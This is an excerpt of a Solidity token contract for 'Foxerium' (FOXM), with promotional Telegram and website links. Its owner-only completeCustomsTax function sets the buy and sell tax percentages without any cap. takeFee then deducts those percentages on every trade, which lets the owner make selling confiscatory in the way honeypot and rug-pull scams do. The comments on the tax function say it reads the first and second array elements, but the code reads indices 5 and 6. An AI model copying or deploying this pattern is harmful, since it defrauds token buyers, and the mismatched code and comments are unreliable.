...
contract FOXM is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Foxerium";
    string private _symbol = "FOXM";
    ...
    uint256 private _totalSupply = 1 * 10**9 * 1**1 * 10**_decimals;
    uint256 public _walletMax = 3 * 10**7 * 1**1 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 3 * 10**6 * 1**1 * 10**_decimals;
    ...
    function completeCustomsTax(uint256[] calldata customs) external onlyOwner {
        _totalTaxIfBuying = customs[5]; // Corrected index to access the first element
        _totalTaxIfSelling = customs[6]; // Corrected index to access the second element
    }
    ...
    // Telegram: https://t.me/Foxerium

    // Website: https://foxerium.com/
    ...
    function takeFee(
        ...
        uint256 feeBuy = amount.mul(_totalTaxIfBuying).div(100);
        uint256 feeSell = amount.mul(_totalTaxIfSelling).div(100);
        uint256 totalFee = feeBuy + feeSell;

        uint256 feeAmount = 0;

        if (isMarketPair[sender]) {
            feeAmount = totalFee - feeSell;
        } else if (isMarketPair[recipient]) {
            feeAmount = totalFee - feeBuy;
        }
